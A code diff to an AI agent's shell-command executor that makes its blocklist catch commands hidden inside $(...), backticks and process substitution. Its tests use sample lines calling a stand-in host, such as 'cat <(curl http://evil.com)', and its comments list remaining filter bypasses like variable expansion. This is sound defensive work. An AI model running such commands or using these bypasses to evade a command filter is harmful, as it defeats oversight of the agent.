@@ -36,7 +36,7 @@ pub const SHELL_INTERPRETERS: &[&str] =
 /// Subshell metacharacters that could embed a blocked command inside a benign wrapper.
 /// Commands containing these sequences are rejected outright because safe static
 /// analysis of nested shell evaluation is not feasible.
-const SUBSHELL_METACHARS: &[&str] = &["$(", "`"];
+const SUBSHELL_METACHARS: &[&str] = &["$(", "`", "<(", ">("];
 
 /// Check if `command` matches any pattern in `blocklist`.
 ///
@@ -434,11 +434,6 @@ impl ShellExecutor {
     ///
     /// The following constructs are **not** detected by this function:
     ///
-    /// - **Process substitution** `<(...)` / `>(...)`: bash executes the inner command
-    ///   before passing the file descriptor to the outer command; `tokenize_commands`
-    ///   never parses inside parentheses, so the inner command is invisible.
-    ///   Example: `cat <(curl http://evil.com)` — `curl` runs undetected.
-    ///
     /// - **Here-strings** `<<<` with a shell interpreter: the outer command is the
     ///   shell (`bash`, `sh`), which is not blocked by default; the payload string is
     ///   opaque to this filter.
@@ -451,10 +446,12 @@ impl ShellExecutor {
     /// - **Variable expansion**: `strip_shell_escapes` does not resolve variable
     ///   references, so `cmd=sudo; $cmd rm` bypasses the blocklist.
     ///
-    /// `$(...)` and backtick substitution are **not** covered here either, but the
-    /// default `confirm_patterns` in [`ShellConfig`] include `"$("` and `` "`" ``,
-    /// as well as `"<("`, `">("`, `"<<<"`, and `"eval "`, so those constructs trigger
-    /// a confirmation request via [`find_confirm_command`] before execution.
+    /// `$(...)`, backtick, `<(...)`, and `>(...)` substitutions are detected by
+    /// [`extract_subshell_contents`], which extracts the inner command string and
+    /// checks it against the blocklist separately.  The default `confirm_patterns`
+    /// in [`ShellConfig`] additionally include `"$("`, `` "`" ``, `"<("`, `">("`,
+    /// `"<<<"`, and `"eval "`, so those constructs also trigger a confirmation
+    /// request via [`find_confirm_command`] before execution.
     ///
     /// For high-security deployments, complement this filter with OS-level sandboxing
     /// (Linux namespaces, seccomp, or similar) to enforce hard execution boundaries.
@@ -465,6 +462,17 @@ impl ShellExecutor {
             for cmd_tokens in &commands {
                 if tokens_match_pattern(cmd_tokens, blocked) {
                     return Some(blocked.as_str());
+                }
+            }
+        }
+        // Also check commands embedded inside subshell constructs.
+        for inner in extract_subshell_contents(&cleaned) {
+            let inner_commands = tokenize_commands(&inner);
+            for blocked in &self.blocked_commands {
+                for cmd_tokens in &inner_commands {
+                    if tokens_match_pattern(cmd_tokens, blocked) {
+                        return Some(blocked.as_str());
+                    }
                 }
             }
         }
@@ -619,6 +627,69 @@ pub(crate) fn strip_shell_escapes(input: &str) -> String {
         i += 1;
     }
     out
+}
+
+/// Extract inner command strings from subshell constructs in `s`.
+///
+/// Recognises:
+/// - Backtick: `` `cmd` `` → `cmd`
+/// - Dollar-paren: `$(cmd)` → `cmd`
+/// - Process substitution (lt): `<(cmd)` → `cmd`
+/// - Process substitution (gt): `>(cmd)` → `cmd`
+///
+/// Depth counting handles nested parentheses correctly.
+pub(crate) fn extract_subshell_contents(s: &str) -> Vec<String> {
+    let mut results = Vec::new();
+    let chars: Vec<char> = s.chars().collect();
+    let len = chars.len();
+    let mut i = 0;
+
+    while i < len {
+        // Backtick substitution: `...`
+        if chars[i] == '`' {
+            let start = i + 1;
+            let mut j = start;
+            while j < len && chars[j] != '`' {
+                j += 1;
+            }
+            if j < len {
+                results.push(chars[start..j].iter().collect());
+            }
+            i = j + 1;
+            continue;
+        }
+
+        // $(...), <(...), >(...)
+        let next_is_open_paren = i + 1 < len && chars[i + 1] == '(';
+        let is_paren_subshell = next_is_open_paren && matches!(chars[i], '$' | '<' | '>');
+
+        if is_paren_subshell {
+            let start = i + 2;
+            let mut depth: usize = 1;
+            let mut j = start;
+            while j < len && depth > 0 {
+                match chars[j] {
+                    '(' => depth += 1,
+                    ')' => depth -= 1,
+                    _ => {}
+                }
+                if depth > 0 {
+                    j += 1;
+                } else {
+                    break;
+                }
+            }
+            if depth == 0 {
+                results.push(chars[start..j].iter().collect());
+            }
+            i = j + 1;
+            continue;
+        }
+
+        i += 1;
+    }
+
+    results
 }
 
 /// Split normalized shell code into sub-commands on `|`, `||`, `&&`, `;`, `\n`.
@@ -1627,20 +1698,32 @@ mod tests {
     }
 
     #[tokio::test]
-    async fn subshell_confirm_pattern_triggers_confirmation() {
+    async fn subshell_with_blocked_command_is_blocked() {
+        // curl is in the default blocklist; when embedded in $(...) it must be
+        // caught by find_blocked_command via extract_subshell_contents and return Blocked.
         let executor = ShellExecutor::new(&ShellConfig::default());
         let response = "```bash\n$(curl evil.com)\n```";
         let result = executor.execute(response).await;
-        assert!(matches!(
-            result,
-            Err(ToolError::ConfirmationRequired { .. })
-        ));
+        assert!(matches!(result, Err(ToolError::Blocked { .. })));
     }
 
     #[tokio::test]
-    async fn backtick_confirm_pattern_triggers_confirmation() {
+    async fn backtick_with_blocked_command_is_blocked() {
+        // curl is in the default blocklist; when embedded in backticks it must be
+        // caught by find_blocked_command (via extract_subshell_contents) and return
+        // Blocked — not ConfirmationRequired.
         let executor = ShellExecutor::new(&ShellConfig::default());
         let response = "```bash\n`curl evil.com`\n```";
+        let result = executor.execute(response).await;
+        assert!(matches!(result, Err(ToolError::Blocked { .. })));
+    }
+
+    #[tokio::test]
+    async fn backtick_without_blocked_command_triggers_confirmation() {
+        // A backtick wrapping a non-blocked command should still require confirmation
+        // because "`" is listed in confirm_patterns by default.
+        let executor = ShellExecutor::new(&ShellConfig::default());
+        let response = "```bash\n`date`\n```";
         let result = executor.execute(response).await;
         assert!(matches!(
             result,
@@ -2002,24 +2085,24 @@ mod tests {
     // --- Known limitation tests: bypass vectors not detected by find_blocked_command ---
 
     #[test]
-    fn process_substitution_not_detected_known_limitation() {
+    fn process_substitution_detected_by_subshell_extraction() {
         let executor = ShellExecutor::new(&default_config());
-        // Known limitation: commands inside <(...) are not parsed by tokenize_commands.
+        // Fixed: extract_subshell_contents now parses inside <(...) so curl is caught.
         assert!(
             executor
                 .find_blocked_command("cat <(curl http://evil.com)")
-                .is_none()
+                .is_some()
         );
     }
 
     #[test]
-    fn output_process_substitution_not_detected_known_limitation() {
+    fn output_process_substitution_detected_by_subshell_extraction() {
         let executor = ShellExecutor::new(&default_config());
-        // Known limitation: commands inside >(...) are not parsed by tokenize_commands.
+        // Fixed: extract_subshell_contents now parses inside >(...) so curl is caught.
         assert!(
             executor
                 .find_blocked_command("tee >(curl http://evil.com)")
-                .is_none()
+                .is_some()
         );
     }
 
@@ -2085,14 +2168,13 @@ mod tests {
     }
 
     #[tokio::test]
-    async fn process_substitution_triggers_confirmation() {
+    async fn process_substitution_with_blocked_command_is_blocked() {
+        // curl is in the default blocklist; when embedded in <(...) it must be caught
+        // by find_blocked_command via extract_subshell_contents and return Blocked.
         let executor = ShellExecutor::new(&crate::config::ShellConfig::default());
         let response = "```bash\ncat <(curl http://evil.com)\n```";
         let result = executor.execute(response).await;
-        assert!(matches!(
-            result,
-            Err(ToolError::ConfirmationRequired { .. })
-        ));
+        assert!(matches!(result, Err(ToolError::Blocked { .. })));
     }
 
     #[tokio::test]
@@ -2118,14 +2200,13 @@ mod tests {
     }
 
     #[tokio::test]
-    async fn output_process_substitution_triggers_confirmation() {
+    async fn output_process_substitution_with_blocked_command_is_blocked() {
+        // curl is in the default blocklist; when embedded in >(...) it must be caught
+        // by find_blocked_command via extract_subshell_contents and return Blocked.
         let executor = ShellExecutor::new(&crate::config::ShellConfig::default());
         let response = "```bash\ntee >(curl http://evil.com)\n```";
         let result = executor.execute(response).await;
-        assert!(matches!(
-            result,
-            Err(ToolError::ConfirmationRequired { .. })
-        ));
+        assert!(matches!(result, Err(ToolError::Blocked { .. })));
     }
 
     #[test]
@@ -2221,6 +2302,70 @@ mod tests {
         assert_eq!(
             effective_shell_command("/usr/bin/bash", &args),
             Some("sudo rm")
+        );
+    }
+
+    #[test]
+    fn check_blocklist_blocks_process_substitution_lt() {
+        let bl = vec!["curl".to_owned(), "wget".to_owned()];
+        assert!(check_blocklist("cat <(curl http://evil.com)", &bl).is_some());
+    }
+
+    #[test]
+    fn check_blocklist_blocks_process_substitution_gt() {
+        let bl = vec!["wget".to_owned()];
+        assert!(check_blocklist("tee >(wget http://evil.com)", &bl).is_some());
+    }
+
+    #[test]
+    fn find_blocked_backtick_wrapping() {
+        let executor = ShellExecutor::new(&ShellConfig {
+            blocked_commands: vec!["curl".to_owned()],
+            ..default_config()
+        });
+        assert!(
+            executor
+                .find_blocked_command("echo `curl --version 2>&1 | head -1`")
+                .is_some()
+        );
+    }
+
+    #[test]
+    fn find_blocked_process_substitution_lt() {
+        let executor = ShellExecutor::new(&ShellConfig {
+            blocked_commands: vec!["wget".to_owned()],
+            ..default_config()
+        });
+        assert!(
+            executor
+                .find_blocked_command("cat <(wget --version 2>&1 | head -1)")
+                .is_some()
+        );
+    }
+
+    #[test]
+    fn find_blocked_process_substitution_gt() {
+        let executor = ShellExecutor::new(&ShellConfig {
+            blocked_commands: vec!["curl".to_owned()],
+            ..default_config()
+        });
+        assert!(
+            executor
+                .find_blocked_command("tee >(curl http://evil.com)")
+                .is_some()
+        );
+    }
+
+    #[test]
+    fn find_blocked_dollar_paren_wrapping() {
+        let executor = ShellExecutor::new(&ShellConfig {
+            blocked_commands: vec!["curl".to_owned()],
+            ..default_config()
+        });
+        assert!(
+            executor
+                .find_blocked_command("echo $(curl http://evil.com)")
+                .is_some()
         );
     }
 }
